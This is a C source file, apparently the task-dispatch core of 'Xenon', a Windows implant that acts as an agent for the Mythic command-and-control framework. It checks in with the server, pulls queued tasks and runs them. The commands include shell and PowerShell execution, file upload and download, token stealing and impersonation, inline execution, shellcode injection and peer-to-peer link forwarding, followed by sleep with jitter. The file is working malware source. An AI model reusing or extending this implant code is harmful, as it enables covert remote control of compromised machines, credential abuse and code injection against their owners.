#include "Xenon.h"
#include "Task.h"

#include "Sleep.h"
#include "Config.h"

#include "Tasks/Agent.h"
#include "Tasks/Shell.h"
#include "Tasks/FileSystem.h"
#include "Tasks/Process.h"
#include "Tasks/Download.h"
#include "Tasks/Upload.h"
#include "Tasks/InlineExecute.h"
#include "Tasks/InjectShellcode.h"
#include "Tasks/Token.h"
#include "Tasks/Link.h"
#include "Tasks/Exit.h"

/**
 * @brief @brief Dispatches and executes queued tasks from Mythic server.

 * @param [in] cmd Task command ID.
 * @param [in] taskUuid Mythic's UUID for tracking tasks.
 * @param [in] taskParser PPARSER struct containing data related to the task.
 * @return VOID
 */
VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
    switch (cmd) {
#ifdef INCLUDE_CMD_STATUS     // Built-in
        case STATUS_CMD:
        {
            _dbg("STATUS_CMD was called");
            AgentStatus(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_SLEEP    // Built-in
        case SLEEP_CMD:
        {
            _dbg("CMD_SLEEP was called");
            AgentSleep(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_EXAMPLE
        case EXAMPLE_CMD:
        {
            _dbg("EXAMPLE_CMD was called");
            // CommandExample(taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_CD
        case CD_CMD:
        {
            _dbg("CD_CMD was called");
            FileSystemCd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_PWD
        case PWD_CMD:
        {
            _dbg("PWD_CMD was called");
            FileSystemPwd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_MKDIR
        case MKDIR_CMD:
        {
            _dbg("MKDIR_CMD was called");
            FileSystemMkdir(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_CP
        case CP_CMD:
        {
            _dbg("CP_CMD was called");
            FileSystemCopy(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_LS
        case LS_CMD:
        {
            _dbg("LS_CMD was called");
            FileSystemList(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_RM
        case RM_CMD:
        {
            _dbg("RM_CMD was called");
            FileSystemRemove(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_DOWNLOAD
        case DOWNLOAD_CMD:
        {
            _dbg("DOWNLOAD_CMD was called");
            Download(taskUuid, taskParser);

            // Freed inside of thread function
            // TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
            // if (!tp)
            // {
            //     _err("Failed to allocate memory for task parameter.");
            //     return;
            // }

            // tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
            // if (!tp->TaskParser) {
            //     _err("Failed to allocate memory for TaskParser.");
            //     free(tp->TaskUuid);
            //     LocalFree(tp);
            //     return;
            // }

            // // Duplicate so we don't use values that are freed before the thread finishes
            // tp->TaskUuid = _strdup(taskUuid);
            // ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);

            // // Threaded so it doesn't block main thread (usually needs alot of requests).
            // HANDLE hThread = CreateThread(NULL, 0, DownloadThread, (LPVOID)tp, 0, NULL);
            // if (!hThread) {
            //     _err("Failed to create download thread");
            //     free(tp->TaskUuid);
            //     ParserDestroy(tp->TaskParser);
            //     LocalFree(tp);
            // } else {
            //     CloseHandle(hThread); // Let the thread run independently
            // }
            
            return;
        }
#endif
#ifdef INCLUDE_CMD_UPLOAD
        case UPLOAD_CMD:
        {
            _dbg("UPLOAD_CMD was called");

            // Freed inside of thread function
            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
            if (!tp)
            {
                _err("Failed to allocate memory for task parameter.");
                return;
            }

            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
            if (!tp->TaskParser) {
                _err("Failed to allocate memory for TaskParser.");
                free(tp->TaskUuid);
                LocalFree(tp);
                return;
            }

            // Duplicate so we don't use values that are freed before the thread finishes
            tp->TaskUuid = _strdup(taskUuid);
            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);

            // Threaded so it doesn't block main thread (usually needs alot of requests).
            HANDLE hThread = CreateThread(NULL, 0, UploadThread, (LPVOID)tp, 0, NULL);
            if (!hThread) {
                _err("Failed to create upload thread");
                free(tp->TaskUuid);
                ParserDestroy(tp->TaskParser);
                LocalFree(tp);
            } else {
                CloseHandle(hThread); // Let the thread run independently
            }
            
            return;
        }
#endif
#ifdef INCLUDE_CMD_SHELL
        case SHELL_CMD:
        {
            _dbg("SHELL_CMD was called");
            ShellCmd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_EXIT
        case EXIT_CMD:
        {
            _dbg("EXIT_CMD was called");
            Exit(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_PS
        case PS_CMD:
        {
            _dbg("PROCLIST_CMD was called");
            ProcessList(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_GETUID
        case GETUID_CMD:
        {
            _dbg("GETUID was called");
            TokenGetUid(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_STEAL_TOKEN
        case STEAL_TOKEN_CMD:
        {
            _dbg("STEAL_TOKEN_CMD was called");
            TokenSteal(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_MAKE_TOKEN
        case MAKE_TOKEN_CMD:
        {
            _dbg("MAKE_TOKEN_CMD was called");
            TokenMake(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_REV2SELF
    case REV2SELF_CMD:
        {
            _dbg("REV2SELF_CMD was called");
            TokenRevert(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_PWSH
        case PWSH_CMD:
        {
            _dbg("PWSH_CMD was called");
            PwshCmd(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_INLINE_EXECUTE
        case INLINE_EXECUTE_CMD:
        {
            _dbg("INLINE_EXECUTE_CMD was called");
            
            InlineExecute(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_SPAWNTO
        case SPAWNTO_CMD:
        {
            _dbg("SPAWNTO_CMD was called");
            AgentSpawnto(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_INJECT_SHELLCODE
        case INJECT_SHELLCODE_CMD:
        {
            _dbg("INJECT_SHELLCODE_CMD was called");
            InjectShellcode(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_LINK
        case LINK_CMD:
        {
            _dbg("LINK_CMD was called");
            Link(taskUuid, taskParser);
            return;
        }
#endif
#ifdef INCLUDE_CMD_UNLINK
        case UNLINK_CMD:
        {
            _dbg("UNLINK_CMD was called");
            Unlink(taskUuid, taskParser);
            return;
        }
#endif
    }// END OF CMDS
}

BOOL TaskCheckin(PPARSER checkinResponseData)
{   
    if (checkinResponseData == NULL)
    {
        _err("Checkin data cannot be null.");
        return FALSE;
    }

    BOOL bStatus = FALSE;
    
    BYTE checkinByte = ParserGetByte(checkinResponseData);
    if (checkinByte != CHECKIN)
    {
        _err("CHECKIN byte 0x%x != 0xF1", checkinByte);
        goto end;
    }

    // Mythic sends a new UUID after the checkin, we need to update it
    SIZE_T sizeUuid = TASK_UUID_SIZE;
    PCHAR tempUUID = ParserGetString(checkinResponseData, &sizeUuid);           // ToDo use ParserStringCopy

    // Allocate memory for newUUID and copy the UUID string
    PCHAR newUUID = (PCHAR)malloc(sizeUuid + 1);  // +1 for the null terminator
    if (newUUID == NULL) {
        goto end;
    }
    memcpy(newUUID, tempUUID, sizeUuid);  // Copy UUID bytes
    newUUID[sizeUuid] = '\0';             // Null-terminate the string

    _dbg("[CHECKIN] Setting new Agent UUID -> %s", newUUID);

    XenonUpdateUuid(newUUID);

    bStatus = TRUE;

end:
    return bStatus;
}

VOID TaskProcess(PPARSER tasks)
{
    // Determine the type of response from server (get_tasking, post_response, etc)
    BYTE typeResponse = ParserGetByte(tasks);
    
    if (typeResponse != GET_TASKING)
    {
        _err("[NONE] Task not recognized!! Byte key -> %x\n\n", typeResponse);
        return;
    }

    UINT32 numTasks = ParserGetInt32(tasks);
    if (numTasks) {
        _dbg("[TASKING] Got %d tasks!", numTasks);
    }
    
    for (UINT32 i = 0; i < numTasks; i++) 
    {       
        PARSER taskParser = { 0 };

        SIZE_T  sizeTask        = ParserGetInt32(tasks) - TASK_UUID_SIZE - 1;   // Subtract 36 (uuid) + 1 (task id)
        BYTE    taskId          = ParserGetByte(tasks);                         // Command ID
        SIZE_T  uuidLength      = TASK_UUID_SIZE;
        PCHAR   taskUuid        = ParserGetString(tasks, &uuidLength);          // Mythic task uuid
        PBYTE   taskBuffer      = ParserGetBytes(tasks, &sizeTask);             // Rest of data related to task
        
        ParserNew(&taskParser, taskBuffer, sizeTask);
        
        // Do the task one-by-one, each cmd function handles responses
        TaskDispatch(taskId, taskUuid, &taskParser);

        ParserDestroy(&taskParser);
    }
}

/** 
 * @brief Process the responses from Tasks
 * 
 * This is for tasks that require back n forth
 * e.g., download, upload, p2p
 */
VOID TaskProcessResponses(PPARSER Response)
{
    /* 
        TODO 
        - Handle multiple responses here
        {
            "action":"post_response",
            "responses":[
                {
                    "file_id":"",
                    "status":"success",
                    "task_id":""
                },
                {
                    more
                }
            ]
        }
    */

    SIZE_T fidLen       = TASK_UUID_SIZE;
    SIZE_T tidLen       = TASK_UUID_SIZE;
    PCHAR  FileUuid     = NULL;
    PCHAR  TaskUuid     = NULL;
    BYTE   Type         = NULL;
    BYTE   Status       = NULL;

    Status              = ParserGetByte(Response);
    Status              = ParserGetByte(Response);
    Type                = ParserGetByte(Response);
    TaskUuid            = ParserStringCopy(Response, &tidLen);

    _dbg("TaskUuid: %d bytes length - %s", tidLen, TaskUuid);

    if ( Type == DOWNLOAD_RESP )
    {
        FileUuid = ParserStringCopy(Response, &fidLen);

        if ( !DownloadUpdateFileUuid(TaskUuid, FileUuid) ) {
            _err("Failed to update download file ID.");
        }
    }

    /* Upload etc */


    /* Clean Up */
    if (FileUuid) LocalFree(FileUuid);
    if (TaskUuid) LocalFree(TaskUuid);
}

VOID TaskRoutine()
{
/*
    What if I refactor the task handler to loop through different 
    "packages" and make delegates a package task. DELEGATE_FORWARD
*/

    PARSER Test = { 0 };
    if ( PackageSendAll(&Test) )
    {
        if ( Test.Buffer != NULL )
        {
            _dbg("Response from PackageSendALL");
            print_bytes(Test.Buffer, Test.Length);

            TaskProcessResponses(&Test);
        }
    }
    

    if (&Test != NULL) ParserDestroy(&Test);


    /* Ask server for new tasks */
    PARSER   tasks   = { 0 };
    PPackage req     = NULL;
    
    req = PackageInit(GET_TASKING, TRUE);
    
    PackageAddInt32(req, NUMBER_OF_TASKS);

    BOOL bStatus = PackageSend(req, &tasks);
    
    if (bStatus == FALSE || tasks.Buffer == NULL)
        goto CLEANUP;

    /**
     * TODO - Fix this as it breaks things that use PackageSend and process a response
     * Such as:
     *  Download
     *  Upload
     */


    /* Check response for Delegate msgs */
    BOOL isDelegates        = (BOOL)ParserGetByte(&tasks);
    _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");

#if defined(INCLUDE_CMD_LINK)

    PCHAR  P2pUuid          = NULL;
    PCHAR  P2pMsg           = NULL;
    SIZE_T P2pIdLen         = 0;
    SIZE_T P2pMsgLen        = 0;
    UINT32 NumOfDelegates   = 0;
    if ( isDelegates ) 
    {
        NumOfDelegates  = ParserGetInt32(&tasks);
        P2pUuid         = ParserGetString(&tasks, &P2pIdLen);
        P2pMsg          = ParserGetString(&tasks, &P2pMsgLen);

        _dbg("Package should contain : %d msgs.", NumOfDelegates);
        _dbg("P2P New UUID           : %s", P2pUuid);
        _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
        /* Forward msg to intended Linked Agent */
        LinkForward( P2pMsg, P2pMsgLen );
    }

#endif


    /* Process all tasks */
    TaskProcess(&tasks);


    /* Check all Links and push delegates to Server */
#if defined(INCLUDE_CMD_LINK)

    LinkPush();
    
#endif

    /* Push File Chunks to Server */
#if defined(INCLUDE_CMD_DOWNLOAD)

    DownloadPush();

#endif


CLEANUP:
    // Cleanup
    if (req != NULL) PackageDestroy(req);
    if (&tasks != NULL) ParserDestroy(&tasks);

    // zzzz
    SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);

    return;
}